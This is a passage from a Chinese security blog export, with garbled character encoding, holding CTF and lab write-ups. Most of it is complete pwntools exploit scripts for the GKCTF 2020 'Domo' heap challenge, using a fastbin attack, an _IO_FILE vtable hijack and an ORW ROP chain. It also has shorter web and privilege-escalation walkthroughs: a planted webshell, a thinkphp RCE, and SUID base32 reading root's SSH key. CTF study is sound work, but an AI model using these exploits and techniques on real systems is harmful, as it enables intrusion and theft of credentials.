chunkçš„sizeï¼Œé€šè¿‡fastbins attackåˆ°è¿™é‡Œä¿®æ”¹vtableã€‚ 123456789101112fake_chunk = _IO_2_1_stdin_ + 160 - 0x3cmd_add(0xc0,'') # index 2cmd_add(0x60,'') # index 3cmd_del(3)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk)) # overwrite fdcmd_add(0xa8,p64(0)*2+p64(one_gadget)*19) # fake vtablefake_vtable = head_addr + offsetpayload = '\\x00'*3+flat(0,0,0xffffffff,0,0,fake_vtable,0,0,0,0,0,0)cmd_add(0x60,'')cmd_add(0x63,payload) è¿™é‡Œé€šè¿‡one_gedgetå°±å·²ç»getshelläº†ã€‚ è¿˜æœ‰å¦ä¸€ç§æ€è·¯å°±æ˜¯å‡ºé¢˜äººçš„æ€è·¯ï¼Œlibcçš„environé‡Œè®°ç€stackçš„åœ°å€ã€‚ ç”¨åŒæ ·æ˜¯_IO_FILEçš„_IO_2_1_stdout_ï¼Œæ§åˆ¶äº†å…¶ä¸­_IO_write_baseã€_IO_write_ptrå’Œflagï¼Œå°±èƒ½ä»»æ„åœ°å€è¯»å–ã€‚_IO_write_baseä¸ºè¯»å–çš„èµ·å§‹åœ°å€ï¼Œ_IO_write_pträ¸ºè¯»å–çš„æœ«åœ°å€ï¼Œå¹¶ä¸”flagçš„å€¼è¦å¾—æ˜¯0xfbad1800æ‰èƒ½æ­£å¸¸è¯»å–ï¼Œè‡³äºæ˜¯ä¸ºä»€ä¹ˆï¼Œåœ¨åé¢å‚è€ƒçš„æœ€åä¸€æ¡æœ‰è¯´ï¼Œä½†æˆ‘æ˜¯æ²¡çœ‹æ‡‚-_-!ã€‚åœ¨_IO_2_1_stdout_ - 0x43çš„åœ°æ–¹æ‰¾åˆ°ä¸ªåˆé€‚çš„fake chunkçš„sizeï¼Œå…¶ä»–åœ°æ–¹çš„å¡«å……å°±ç”¨åŸæ¥çš„å€¼_IO_2_1_stdout_ + 131å°±è¡Œã€‚ åœ¨ä¿®æ”¹æˆåŠŸä¹‹åå†å»_IO_2_1_stdout_é‚£çœ‹è¿˜æ˜¯æ²¡æ”¹é‚£æ ·çš„ï¼Œä½†æ˜¯èƒ½æ¥æ”¶åˆ°è¾“å‡ºçš„ï¼Œå¯èƒ½æ˜¯è¾“å‡ºå®Œå°±æ¢å¤äº†ã€‚ 1234567891011fake_chunk = _IO_2_1_stdout_ - 0x43cmd_add(0xc0,'') # index 2cmd_add(0x60,'') # index 3cmd_del(3)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk)) # overwrite fdpayload = '\\x00'*3+flat(0,0,0,0,0,'_IO_file_jumps',0xfbad1800,_IO_2_1_stdout_+131,_IO_2_1_stdout_+131,_IO_2_1_stdout_+131,libc.sym['environ'],libc.sym['environ']+8)cmd_add(0x60,'')cmd_add(0x63,payload)stack_addr = u64(p.recv(6).ljust(8,'\\x00')) å‰é¢ä»environè¯»æ ˆåœ°å€å°±æ˜¯ä¸ºäº†æ”¹è¿”å›åœ°å€æ§åˆ¶EIPï¼Œ_IO_2_1_stdin_çš„ä»»æ„åœ°å€å†™è·Ÿ_IO_2_1_stdout_çš„ä»»æ„åœ°å€è¯»ç±»ä¼¼ï¼Œä¹Ÿæ˜¯éœ€è¦æ§åˆ¶flagè¿˜æœ‰_IO_buf_baseå’Œ_IO_buf_endã€‚ è¿™é‡Œè¯´ä¸‹æˆ‘ç”¨éå¯¹é½çš„ä½ç½®åšè¿™æ¬¡fake chunkçš„sizeæ—¶ä¼šå‡ºé”™ï¼Œç”¨å‡ºé¢˜äººçš„æ–¹æ³•ï¼Œä»»æ„åœ°å€å†™çš„å‡½æ•°å†™ä¸€å­—èŠ‚ä½œä¸ºsizeçš„æ–¹æ³•å´æ²¡é—®é¢˜ï¼Œè¿˜æœ‰ä¸ºäº†payloadå‰åŠ 5\\né¡ºä¾¿é€€å‡ºç¨‹åºï¼Œå†™å…¥åˆ°_IO_buf_baseçš„è¿”å›åœ°å€è¦-2ä»¥æ¥æ”¶5\\nã€‚è¿™å›é™¤äº†flagã€_IO_buf_baseå’Œ_IO_buf_endå¤–ï¼Œå…¶ä½™ä½ç½®ç”¨0å¡«å……å³å¯ã€‚ 123456789101112fake_chunk = _IO_2_1_stdin_ - 0x28ret_addr = stack_addr + offsetcmd_add(0x60,'')cmd_del(4)cmd_del(2)cmd_del(1)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk))cmd_add(0x40,'flag\\x00') # save orw outputcmd_add(0x60,'')payload = flat(0,_IO_file_jumps,0,0xfbad1800,0,0,0,0,0,0,ret_addr-2,ret_addr+0x118)cmd_edit(stdin_hook-0x20,'\\x7f')cmd_add(0x60,payload) å› ä¸ºæœ‰seccompçš„æ²™ç®±ï¼Œæ”¹mainå‡½æ•°çš„è¿”å›åœ°å€ä¸ºgadgetæ˜¯æ²¡æ³•getshellçš„ã€‚ç¦äº†äº›å±é™©çš„syscallï¼Œåªèƒ½ç”¨orwï¼ˆopen,read,writeï¼‰ï¼Œæ‰€ä»¥å‰é¢contentä¸ºflagçš„chunkæ˜¯è¦opençš„æ–‡ä»¶åï¼Œå’Œé¡ºä¾¿ç”¨æ¥å­˜è¾“å‡ºã€‚è¿˜æœ‰è¦æ³¨æ„æ–‡ä»¶åè¦æˆªæ–­ï¼Œä¹‹å‰æ²¡æ³¨æ„ï¼Œæ€ªä¸å¾—ä¸€ç›´éƒ½è¯»ä¸åˆ°flag-_-!ã€‚ 123456789prdi = libc.search(asm(\"pop rdi\\nret\")).next()prsi = libc.search(asm(\"pop rsi\\nret\")).next()prdx = libc.search(asm(\"pop rdx\\nret\")).next()open_addr = libc.sym['open']read_addr = libc.sym['read']write_addr = libc.sym['write']filename_addr = heap_addr + 0x210orw = flat(prdi,filename_addr,prsi,72,open_addr,prdi,3,prsi,filename_addr+0x8,prdx,0x30,read_addr,prdi,1,prsi,filename_addr+0x8,prdx,0x100,write_addr)p.sendlineafter('&gt; ','5\\n'+orw) è¿”å›åœ°å€è¦†ç›–ä¸Šäº†ROPï¼Œå¯¹äº†ï¼Œè¿™é‡Œçš„ROPç”¨çš„æ˜¯libcçš„ã€‚æ¯•ç«ŸçŸ¥é“äº†libcçš„åœ°å€ï¼Œlibcçš„ROPåç§»æ˜¯ä¸€å®šçš„ï¼ŒELFçš„å¥½åƒä¸æ˜¯ï¼Œç”¨èµ·æ¥æ¯”è¾ƒéº»çƒ¦ã€‚ è´´ä¸Šexpgetshellçš„exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192# -*- coding: utf-8 -*-from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './domo'elf = ELF('./domo')if sys.argv[1] == 'l': p = process('./domo') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',28773) libc = context.binary.libcdef cmd_add(size,content): p.sendlineafter('&gt; ','1') p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content)def cmd_del(index): p.sendlineafter('&gt; ','2') p.sendlineafter('index:',str(index))def cmd_show(index): p.sendlineafter('&gt; ','3') p.sendlineafter('index:\\n',str(index)) return p.recv(6)def cmd_edit(addr,num): p.sendlineafter('&gt; ','4') p.sendlineafter('addr:',str(addr)) p.sendlineafter('num:',num)cmd_add(0x40,'') # 0cmd_add(0x60,'') # 1# leak main_arenacmd_add(0xf0,'') # 2cmd_add(0x10,'') # 3offset = 0x7ffff7bcdb78 - 0x7ffff7bcdb0acmd_del(2)cmd_add(0xf0,'')main_arena = u64(cmd_show(2).ljust(8,'\\x00')) + offsetoffset = 0x7f3d7a680b78 - 0x7f3d7a2bc000libc.address = main_arena - offsetprint(hex(main_arena))print(hex(libc.address))# gdb.attach(p)# leak heap_addrcmd_add(0x10,'') # 4cmd_del(3)cmd_del(4)cmd_add(0x10,'')heap_addr = u64(cmd_show(3).ljust(8,'\\x00')) - 0x10a + 0x10print(hex(heap_addr))# gdb.attach(p)# overlappingcmd_del(0)cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_del(1)cmd_add(0x68,flat('\\x00'*0x60,0xb0))cmd_del(2)# gdb.attach(p)# fastbins attack overwrite vtable_IO_file_jumps = libc.sym['_IO_file_jumps']_IO_2_1_stdin_ = libc.sym['_IO_2_1_stdin_']fake_chunk = _IO_2_1_stdin_ + 160 - 0x3fake_vtable = heap_addr + 0x210one_gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget = libc.address + one_gadgets[2]print(hex(_IO_file_jumps))print(hex(_IO_2_1_stdin_))print(hex(fake_vtable))print(hex(one_gadget))cmd_add(0xc0,'')cmd_add(0x60,'')cmd_del(4)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk))cmd_add(0xa8,p64(0)*2+p64(one_gadget)*19)payload = '\\x00'*3+flat(0,0,0xffffffff,0,0,fake_vtable,0,0,0,0,0,0)cmd_add(0x60,'')gdb.attach(p)cmd_add(0x63,payload)p.interactive() è¯»flagçš„exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120# -*- coding: utf-8 -*-from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './domo'elf = ELF('./domo')if sys.argv[1] == 'l': p = process('./domo') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',29288) libc = context.binary.libcdef cmd_add(size,content): p.sendlineafter('&gt; ','1') p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content)def cmd_del(index): p.sendlineafter('&gt; ','2') p.sendlineafter('index:',str(index))def cmd_show(index): p.sendlineafter('&gt; ','3') p.sendlineafter('index:\\n',str(index)) return p.recv(6)def cmd_edit(addr,num): p.sendlineafter('&gt; ','4') p.sendlineafter('addr:',str(addr)) p.sendlineafter('num:',num)cmd_add(0x40,'') # 0cmd_add(0x60,'') # 1# leak main_arenacmd_add(0xf0,'') # 2cmd_add(0x10,'') # 3offset = 0x7ffff7bcdb78 - 0x7ffff7bcdb0acmd_del(2)cmd_add(0xf0,'')main_arena = u64(cmd_show(2).ljust(8,'\\x00')) + offsetoffset = 0x7f3d7a680b78 - 0x7f3d7a2bc000libc.address = main_arena - offsetprint(hex(main_arena))print(hex(libc.address))# gdb.attach(p)# leak heap_addrcmd_add(0x10,'') # 4cmd_del(3)cmd_del(4)cmd_add(0x10,'')heap_addr = u64(cmd_show(3).ljust(8,'\\x00')) - 0x10a + 0x10print(hex(heap_addr))# gdb.attach(p)# overlappingcmd_del(0)cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_del(1)cmd_add(0x68,flat('\\x00'*0x60,0xb0))cmd_del(2)# gdb.attach(p)# fastbins attack leak stack addrenviron_addr = libc.sym['environ']stdout_hook = libc.sym[\"_IO_2_1_stdout_\"]_IO_file_jumps = libc.sym['_IO_file_jumps']fake_chunk = stdout_hook - 0x43print(hex(environ_addr))print(hex(stdout_hook))cmd_add(0xc0,'')cmd_add(0x60,'')cmd_del(4)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk))payload = '\\x00'*3+flat(0,0,0,0,0,libc.sym['_IO_file_jumps'],0xfbad1800,stdout_hook+131,stdout_hook+131,stdout_hook+131,environ_addr,environ_addr+8)cmd_add(0x60,'')cmd_add(0x68,payload)p.recvline()ret_addr = u64(p.recv(6).ljust(8,'\\x00')) - 0xf0print(hex(ret_addr))# overwrite return addressstdin_hook = libc.sym[\"_IO_2_1_stdin_\"]print(hex(stdin_hook))# fake_chunk = stdin_hook - 0x13 # macllocå‡½æ•°ä¼šå‡ºé”™fake_chunk = stdin_hook - 0x28print(hex(fake_chunk))cmd_add(0x60,'')cmd_del(5)cmd_del(2)cmd_del(1)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk))cmd_add(0x40,'flag\\x00')cmd_add(0x60,'')# payload = '\\x00'*3+flat(0xfbad1800,0,0,0,0,0,0,ret_addr-2,ret_addr+8,0,0,0)payload = flat(0,_IO_file_jumps,0,0xfbad1800,0,0,0,0,0,0,ret_addr-2,ret_addr+0x118) # å‡2ä¸ºäº†æ”¾5\\nprint(hex(len(payload)))# gdb.attach(p)cmd_edit(stdin_hook-0x20,'\\x7f')cmd_add(0x60,payload)prdi = libc.search(asm(\"pop rdi\\nret\")).next()prsi = libc.search(asm(\"pop rsi\\nret\")).next()prdx = libc.search(asm(\"pop rdx\\nret\")).next()open_addr = libc.sym['open']read_addr = libc.sym['read']write_addr = libc.sym['write']filename_addr = heap_addr + 0x210orw = flat(prdi,filename_addr,prsi,72,open_addr,prdi,3,prsi,filename_addr+0x8,prdx,0x30,read_addr,prdi,1,prsi,filename_addr+0x8,prdx,0x100,write_addr)print(hex(len(orw)))gdb.attach(p)p.sendlineafter('&gt; ','5\\n'+orw)p.interactive() åè®°å†è¯´ä¸€éï¼Œè¿™é¢˜å‡ºå¾—çœŸä¸é”™ï¼Œå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œç‰¹åˆ«æ˜¯å…³äº_IO_FILEçŸ¥è¯†ç‚¹ã€‚è¯´å¥è€è¯ï¼Œå¿ƒç»†æŒ–å¤©ä¸‹ï¼Œæˆ‘åšè¿™é¢˜æ—¶å€™ä¸å¤Ÿç»†å¿ƒï¼Œä»¥è‡³äºè¸©äº†ä¸å°‘å‘ï¼Œè€Œä¸”å‰é¢ä¸¤ä¸ªå¸ˆå‚…æ°´å¹³å¾ˆé«˜ï¼Œå¯¹äºè¿™é¢˜ç”¨åˆ°çš„æŠ€å·§éƒ½å¾ˆç†Ÿç»ƒäº†ï¼Œæ‰€ä»¥å†™çš„writeupæœ‰äº›ç»†èŠ‚æ²¡è¯´ï¼Œæˆ‘è¿™èœé¸¡ç¼ºå°‘äº›å‰ç½®çš„çŸ¥è¯†ï¼Œæœ‰äº›åœ°æ–¹çœ‹ä¸æ‡‚ï¼Œæ‰€ä»¥å†™äº†è¿™ç¯‡æ°´æ–‡ï¼Œä¹Ÿä¸ºåé¢çš„å¸ˆå‚…å¡«å¡«å‘ã€‚ å‚è€ƒGKCTF_pwn_Domo(å‡ºé¢˜äººè§’åº¦) GKCTF pwn writeup _IO_FILEåˆ©ç”¨æ€è·¯æ€»ç»“ åˆ©ç”¨stdoutæ¥å¤„ç†æ— leakçš„å †é¢˜","link":"/2020/05/27/GKCTF 2020 Domoåˆ†æ/"},{"title":"GKCTF_2020_Writeup","text":"å‰è¨€é¢˜ç›®æ€»ä½“å¥½åƒä¸å¤ªéš¾ï¼Œé¢˜ç›®è´¨é‡ä¹Ÿå¯ä»¥ã€‚webåœ¨æ¯”èµ›æ—¶å€™åšå‡º3é“é¢˜ï¼Œé©¬é©¬è™è™ï¼Œpwné¢˜è‚äº†å¾ˆä¹…ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œèµ›åèŠ±äº†ä¸¤å¤©æ‰ç ”ç©¶é€ï¼Œä»¥è‡³äºç°åœ¨æ‰å‘writeupï¼Œè¿˜æ˜¯èœï¼Œä¸è¿‡ä¹Ÿé€šè¿‡è¿™é¢˜å­¦åˆ°äº†å¾ˆå¤šã€‚ æ¯”èµ›é‚£å¤©æœ¬æ¥ä¸€æ—©æœ‰ç½‘è¯¾ï¼Œè¾¹ä¸Šè¯¾è¾¹åšé¢˜ï¼Œä½†æ˜¯çˆ·çˆ·åœ¨æˆ‘è¿˜åœ¨ä¸Šè¯¾æ—¶å€™ç¡¬æ‹‰æˆ‘å»å–æ—©èŒ¶-_-!â€¦ WEBCheckINæ‰“å¼€ç›´æ¥ç»™äº†æºç ï¼Œå°å°çš„ä¸€ä¸ªwebshellï¼Œä¼°æ‘¸ç€å¯èƒ½èƒ½ç»•wafã€‚ ä¹ æƒ¯æ€§çš„çœ‹äº†ä¸‹phpinfoï¼Œå‘ç°banäº†å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°ã€‚è¿™æ—¶å€™å½“ç„¶æ˜¯ä¸Šç¥å™¨èšå‰‘ï¼Œä½†æ˜¯å„ç§æ¨¡å¼éƒ½æ²¡æ³•bypassdisable_functionsã€‚ å…¶ä¸­PHP7çš„é‚£ä¸ªæ¨¡å¼å¯èƒ½æ˜¯webç›®å½•ä¸å¯å†™çš„åŸå› ï¼Œæ‰€ä»¥ä¸æˆåŠŸã€‚ç›´æ¥ä¸Šä¼ expåˆ°/tmpç›®å½•ï¼Œincludeä¸€ä¸‹å®ƒå°±è¡Œäº†ã€‚ cveç‰ˆç­¾åˆ°é¢˜ç›®ç»™äº†æç¤ºæ˜¯cve-2020-7066ï¼Œåœ¨å®˜ç½‘æ‰¾åˆ°äº†ä¸€ä¸ªexampleï¼Œä¼°è®¡é¢˜ç›®ä¹Ÿæ˜¯å·®ä¸å¤šçš„ä»£ç ã€‚ ä¾æ®hintï¼Œç…§ç€å®˜ç½‘çš„exampleæˆªæ–­ã€‚åˆå‡ºæ¥ä¸€ä¸ªhintè¦æ±‚hostè¦ä»¥123ç»“å°¾ï¼Œè¿™æ—¶æˆ‘å¯¹localhostã€127.0.0.1å„ç§@123ã€:123ã€/?123â€¦â€¦æœ€åå‘ç°ç”¨127.0.0.123å°±è¡Œâ€¦â€¦ è€å…«å°è¶…å¸‚å„¿å¼€å±€ä¸€ä¸ªå¼€æºå•†åŸç³»ç»Ÿï¼Œä¼°æ‘¸ç€åˆè¦ä»£ç å®¡è®¡äº†ã€‚ç½‘ç«™æœ€ä¸‹æ–¹çš„å®˜ç½‘æä¾›äº†githubçš„æºç ä¸‹è½½é“¾æ¥ï¼Œåˆå› ä¸ºæœ€è¿‘æ˜¯ç‰¹æ®Šæ—¶æœŸï¼Œæºç ä¸‹è½½å¾—ç‰¹åˆ«æ…¢ï¼Œé‚å»gtihubçœ‹ä¸‹commitï¼Œçœ‹èƒ½ä¸èƒ½æ‰¾åˆ°äº›æœ‰ç”¨çš„ä¸œè¥¿ã€‚ æ‰€ä»¥ç»™æˆ‘å‘ç°äº†1.8.0ç‰ˆæœ¬ä¹‹åçš„commitæœ‰ä¸ªtpæ¼æ´åŒæ­¥ä¿®å¤ ã€‚ æœäº†ä¸€ä¸‹åœ¨seebugçš„ä¸€ç¯‡æ–‡ç« é‡Œå‘ç°æ˜¯thinkphp5.1.Xçš„RECæ¼æ´ï¼Œä½†æ˜¯ç”¨expæ€ä¹ˆæ‰“ä¹Ÿæ²¡æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚äºæ˜¯ç­‰æºç è£…å¥½äº†ï¼Œå¼€debugæ¨¡å¼çœ‹çœ‹æ˜¯æ€ä¹ˆå›äº‹ã€‚ è£…å¥½å‘ç°é»˜è®¤å¯†ç æ˜¯è¿™ä¸ªç³»ç»Ÿçš„åå­—ï¼Œå¤§èƒ†çŒœæµ‹é¢˜ç›®çš„å¯†ç ä¹Ÿæ²¡æœ‰æ”¹ï¼ˆæ‰‹åŠ¨æ»‘ç¨½ï¼‰ å°±è¿™æ ·è½»æ¾çš„è¿›å…¥äº†åå°ï¼Œåº”ç”¨ä¸­å¿ƒè¿™ä¸ªåŠŸèƒ½å¾ˆå¼•äººæ³¨ç›®ï¼Œä¼¼ä¹æ¥åˆ°äº†æŒ–æ´æ—¶å€™çš„è€å¥—è·¯ã€‚ ä¸å‡ºæ‰€æ–™ï¼Œæ¯ä¸ªåº”ç”¨åŒ…çš„controllerç›®å½•é‡Œéƒ½æœ‰å‡ ä¸ªphpæ–‡ä»¶ï¼Œäºæ˜¯ä¹åœ¨åå°ç®¡ç†çš„phpæ–‡ä»¶é‡Œæ’å…¥ä¸ªä¸€å¥è¯ï¼Œå†é‡æ–°æ‰“åŒ…ä¸Šä¼ å®‰è£…ã€‚ 1http://06d4e07c-9491-4c5d-86a6-8c98c12b59b1.node3.buuoj.cn/admin.php?s=/plugins/index/pluginsname/goodssales/pluginscontrol/admin/pluginsaction/index.html åœ¨ç®¡ç†é¡µé¢é‚£å°±èƒ½getshellï¼Œèšå‰‘è¿æ¥çš„æ—¶å€™è¦å¸¦ä¸Šcookieã€‚åœ¨æ ¹ç›®å½•å‘ç°äº†å‡flagï¼Œè¯´çœŸçš„flagåœ¨/rootç›®å½•é‡Œï¼Œä½†ç°åœ¨çš„ç”¨æˆ·è¿›ä¸å»/rootç›®å½•ï¼Œä½†æ˜¯æ ¹ç›®å½•çœ‹è§ä¸ªshellè„šæœ¬æ¯”è¾ƒæ˜æ˜¾ï¼Œå†…å®¹ä¸ºæ¯60ç§’æ‰§è¡Œä¸€ä¸ªpythonè„šæœ¬ã€‚ ç”¨èšå‰‘çš„æ¨¡æ‹Ÿç»ˆç«¯çœ‹è§è¿™ä¸ªè„šæœ¬æ˜¯ä»¥rootç”¨æˆ·è¿è¡Œçš„ã€‚ å¥½åœ¨é‚£ä¸ªpythonè„šæœ¬å¯å†™ï¼Œé¡ºç†æˆç« è¯»flagã€‚ REVERSEè¿™é¢˜å…¶å®å¾ˆç®€å•ï¼Œä½†æˆ‘åœ¨æ¯”èµ›æ—¶å€™ç²—å¿ƒå¤§æ„æ²¡åšå‡ºæ¥-_-! IDAç›´æ¥æœç´¢å­—ç¬¦ä¸²ï¼Œå‘ç°ä¸²å¥‡æ€ªçš„å­—ç¬¦ä¸²ï¼Œçœ‹èµ·æ¥ä¸åƒæ˜¯base64ã€‚å½“æ—¶æˆ‘å»åœ¨çº¿çš„base58è§£ç çš„æ—¶å€™é”™æŠŠç¼–ç å½“è§£ç ï¼Œåˆæ²¡ä»”ç»†çœ‹-_-! PWNpwné¢˜å°±çœ‹äº†ä¸€é¢˜ï¼Œé¢˜ç›®æ˜¯çœŸå¿ƒè§‰å¾—å‡ºå¾—ä¸é”™ Domoåœ¨æ¯”èµ›æ—¶æ²¡åšå‡ºæ¥ï¼Œèµ›åå¤ç°äº†ä¸‹ã€‚ å…ˆè´´ä¸€ä¸‹expï¼Œæ€è·¯ç­‰ä¼šå†æ°´ä¸€æ–‡ç»†è¯´ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091# -*- coding: utf-8 -*-from LibcSearcher import *from pwn import *context.log_level = 'DEBUG'context.binary = './domo'elf = ELF('./domo')if sys.argv[1] == 'l': p = process('./domo') libc = context.binary.libcelse: p = remote('node3.buuoj.cn',28773) libc = ELF('./libc.so.6')def cmd_add(size,content): p.sendlineafter('&gt; ','1') p.sendlineafter('size:',str(size)) p.sendlineafter('content:',content)def cmd_del(index): p.sendlineafter('&gt; ','2') p.sendlineafter('index:',str(index))def cmd_show(index): p.sendlineafter('&gt; ','3') p.sendlineafter('index:\\n',str(index)) return p.recv(6)def cmd_edit(addr,num): p.sendlineafter('&gt; ','4') p.sendlineafter('addr:',str(addr)) p.sendlineafter('num:',num)cmd_add(0x40,'') # 0cmd_add(0x60,'') # 1# leak main_arenacmd_add(0xf0,'') # 2cmd_add(0x10,'') # 3offset = 0x7ffff7bcdb78 - 0x7ffff7bcdb0acmd_del(2)cmd_add(0xf0,'')main_arena = u64(cmd_show(2).ljust(8,'\\x00')) + offsetoffset = 0x7f3d7a680b78 - 0x7f3d7a2bc000libc.address = main_arena - offsetprint(hex(main_arena))print(hex(libc.address))# gdb.attach(p)# leak heap_addrcmd_add(0x10,'') # 4cmd_del(3)cmd_del(4)cmd_add(0x10,'')heap_addr = u64(cmd_show(3).ljust(8,'\\x00')) - 0x10a + 0x10print(hex(heap_addr))# gdb.attach(p)# overlappingcmd_del(0)cmd_add(0x40,flat(0,0xb1,heap_addr+0x18,heap_addr+0x20,heap_addr+0x10))cmd_del(1)cmd_add(0x68,flat('\\x00'*0x60,0xb0))cmd_del(2)# gdb.attach(p)# fastbins attack overwrite vtable# _IO_file_jumps = libc.sym['_IO_file_jumps']_IO_2_1_stdin_ = libc.sym['_IO_2_1_stdin_']fake_chunk = _IO_2_1_stdin_ + 160 - 0x3fake_vtable = heap_addr + 0x210one_gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]one_gadget = libc.address + one_gadgets[2]print(hex(_IO_file_jumps))print(hex(_IO_2_1_stdin_))print(hex(fake_vtable))print(hex(one_gadget))cmd_add(0xc0,'')cmd_add(0x60,'')cmd_del(4)cmd_del(1)cmd_del(2)cmd_add(0xc0,flat('\\x00'*0x38,0x71,fake_chunk))cmd_add(0xa8,p64(0)*2+p64(one_gadget)*19)payload = '\\x00'*3+flat(0,0,0xffffffff,0,0,fake_vtable,0,0,0,0,0,0)cmd_add(0x60,'')# gdb.attach(p)cmd_add(0x63,payload)p.interactive() å‚è€ƒget_headers() silently truncates after a null byte Thinkphp5 è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´äº‹ä»¶åˆ†ææŠ¥å‘Š","link":"/2020/05/26/GKCTF_2020_Writeup/"},{"title":"Geisha walkthrought","text":"å‰è¨€å‡†å¤‡æ¥å—ç¤¾ä¼šæ¯’æ‰“ï¼Œå…ˆæ‰¾å‡ ä¸ªé¶æœºæ‰“æ‰“ï¼Œæé«˜å†…ç½‘ã€åæ¸—é€æ°´å¹³ï¼Œå…å¾—ä¸ä¼šæ·±å…¥å°±è¯´ä½ noobï¼Œç–¯ç‹‚è¸©ã€‚ èµ·æ‰‹å…ˆå»vulnhubæ‰¾äº†ä¸ªå…¥é—¨åˆ°ä¸­é—´éš¾åº¦çš„é¶æœºGeisha(å«ç»™å•¥ï¼Ÿï¼Ÿ)ï¼Œç›®æ ‡ï¼šGet the root shell and then obtain flag under /root)ã€‚ åˆ©ç”¨æŠŠæ‰€æœ‰ç«¯å£éƒ½æ‰«äº†ä¸€éï¼Œå‘ç°å¼€å¯äº†ftpã€sshå’Œå¾ˆå¤šhttpæœåŠ¡çš„ç«¯å£ã€‚ æ¯ä¸ªhttpæœåŠ¡ä¸»é¡µéƒ½æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œæ²¡ä»€ä¹ˆåŠŸèƒ½ï¼Œä½†å…¶ä¸­åœ¨7125ç«¯å£æ‰«åˆ°äº†passwdå’Œshadowï¼Œpasswdèƒ½ä¸‹è½½ä¸‹æ¥ã€‚åœ¨shadowé‡Œçœ‹è§æœ‰ä¸¤ä¸ªè´¦å·å¯ç™»å½•åˆ†åˆ«æ˜¯rootå’Œgeishaï¼Œäºæ˜¯ç”¨hydraè·‘ä¸‹å¼±å£ä»¤ã€‚ ç”¨ä¸ªå°å­—å…¸ä¸€ä¸‹å­å°±è·‘å‡ºæ¥äº†ï¼Œäº‹æƒ…å‘å±•åˆ°ç›®å‰ä¸ºæ­¢ä¼¼ä¹è¿˜æŒºé¡ºåˆ©ã€‚ ä½†æ˜¯uname -açœ‹ä¸‹é¶æœºçš„å‘è¡Œç‰ˆæœ¬æŒºæ–°çš„ï¼Œå·ç„äº†ä¸‹åˆ«äººçš„walkthoughï¼Œå‘ç°æ˜¯åˆ©ç”¨SUIDå¯æ‰§è¡Œæ–‡ä»¶è¿è¡Œæ—¶å¯æš‚æ—¶è·å¾—æ–‡ä»¶æ‹¥æœ‰è€…çš„æƒé™çš„è¿™ä¸ªç‰¹ç‚¹æ¥ææƒçš„ï¼ˆæ–°æŠ€èƒ½getï¼‰ã€‚ ä½¿ç”¨å‘½ä»¤find / -perm -u=s -type f 2&gt;/dev/nullæœç´¢æ‰€æœ‰SUIDå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå‘ç°ä¸ªbase32å¯ä»¥ç”¨æ¥ä»»æ„æ–‡ä»¶è¯»å–ã€‚ ç”¨base32 /root/flag.txt | base32 -dç›´æ¥è¯»flagæˆ–è€…base32 /root/.ssh/id_rsa | base32 -dè¯»sshç§é’¥åœ¨æœ¬åœ°å¯¼å…¥å³å¯ã€‚ å‚è€ƒLinux Privilege Escalation using SUID Binaries","link":"/2020/06/11/Geisha-walkthrough/"},{"title":"GlasgowSmile walkthrought","text":"å‰è¨€è¿™æ˜¯ä¸€ä¸ªä¸­ç­‰éš¾åº¦çš„é¶æœºï¼ŒWebæ–¹é¢fuzzåŠ›åº¦ä¸å¤Ÿå¤§ï¼Œå·ç„äº†åˆ«äººçš„walkthroughæ‰åšå‡ºæ¥ï¼Œææƒæ–¹é¢åˆ™è¦ç»†å¿ƒï¼Œå‘ç°ä½œè€…ç•™ä¸‹çš„çº¿ç´¢ã€‚ https://www.vulnhub.com/entry/glasgow-smile-11,491/ åˆ©ç”¨è¿‡ç¨‹nmapæ‰«äº†ä¸‹ï¼Œåªå¼€æ”¾äº†ä¸¤ä¸ªç«¯å£ï¼Œ22å’Œ80ã€‚ 1nmap -p- -T 4 192.168.189.134 è¿›å»80çš„ç½‘é¡µçœ‹åˆ°æ˜¯ä¸€å¼ å°ä¸‘çš„å£çº¸ï¼Œç”¨dirbæ‰«äº†ä¸‹ç›®å½•ï¼Œå‘ç°äº†joomla CMSã€‚ç‰ˆæœ¬æ¯”è¾ƒæ–°ï¼Œå‰å°æ²¡ç”¨çˆ†å‡ºæ¥å…¬å¼€æ¼æ´ã€‚ 1dirb http://192.168.189.134/ /usr/share/wordlists/dirb/big.txt -x /usr/share/wordlists/dirb/extensions_common.txt è¿›åå°ä½¿ç”¨è‡ªå¸¦çš„å­—å…¸çˆ†ç 